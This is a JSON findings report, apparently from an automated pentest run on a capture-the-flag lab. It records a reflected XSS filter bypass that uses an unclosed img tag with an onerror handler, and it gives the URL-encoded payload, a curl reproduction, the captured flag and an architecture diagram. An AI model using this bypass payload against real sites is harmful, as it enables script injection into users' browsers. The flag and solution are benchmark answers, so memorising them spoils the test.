@@ -1,0 +1,32 @@
+{
+  "meta": {
+    "created": "2026-04-12T22:58:34.024748+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "b7a7b644-1c91-4970-a22f-bf0da23e58cf",
+      "timestamp": "2026-04-12T22:58:34.024638+00:00",
+      "title": "XSS Filter Bypass via Unclosed HTML Tag",
+      "severity": "critical",
+      "target": "http://172.17.0.1:54963/page?name=",
+      "description": "The /page endpoint reflects the 'name' GET parameter in the HTML response. The server applies a regex-based HTML tag filter (`<[^>]*>`) that strips all complete HTML tags. However, by omitting the closing `>` from an img tag with an event handler, the filter does not match and the incomplete tag is reflected as-is. In modern browsers, an `<img>` tag without a closing `>` is still parsed when followed by content (like `</form>`) causing the onerror handler to execute. The server-side check recognized this as a valid XSS payload and returned the CTF flag.",
+      "evidence": "GET /page?name=%3Cimg+src%3Dx+onerror%3Dalert%28%27XSS%27%29 HTTP/1.1\n\nResponse body contained:\n<img src=\"static/img/cookies/success_star.png\" alt=\"Correct\" width=\"150\" height=\"150\"><br>Congratulations!<p> Here is the flag: flag{9e5f344a-0906-4866-bc8c-7cdf2163f9d3}</p>\n\nFLAG: flag{9e5f344a-0906-4866-bc8c-7cdf2163f9d3}\n\nPayload: <img src=x onerror=alert('XSS')   (no closing >)\nURL-encoded: %3Cimg+src%3Dx+onerror%3Dalert%28%27XSS%27%29",
+      "tool_used": "manual",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "curl 'http://172.17.0.1:54963/page?name=%3Cimg+src%3Dx+onerror%3Dalert%28%27XSS%27%29'",
+        "expected": "Returns flag{9e5f344a-0906-4866-bc8c-7cdf2163f9d3} in the response body"
+      }
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "7bb73bec-751a-4420-bf5d-0c5446dbc54b",
+      "timestamp": "2026-04-12T22:58:47.485117+00:00",
+      "title": "Dalgona XSS Challenge 22 Architecture",
+      "mermaid": "flowchart TD\n    Browser[\"Browser\"] --> Home[\"GET / Home\"]\n    Browser --> Page[\"GET /page?name=PAYLOAD\"]\n    Page --> Filter[\"Regex Filter strips HTML tags\"]\n    Filter --> Check{\"XSS Check\"}\n    Check -- valid --> Flag[\"Returns CTF Flag\"]\n    Check -- invalid --> Fail[\"Failed message\"]\n    Static[\"GET /static/ Assets\"] --> Browser"
+    }
+  ]
+}
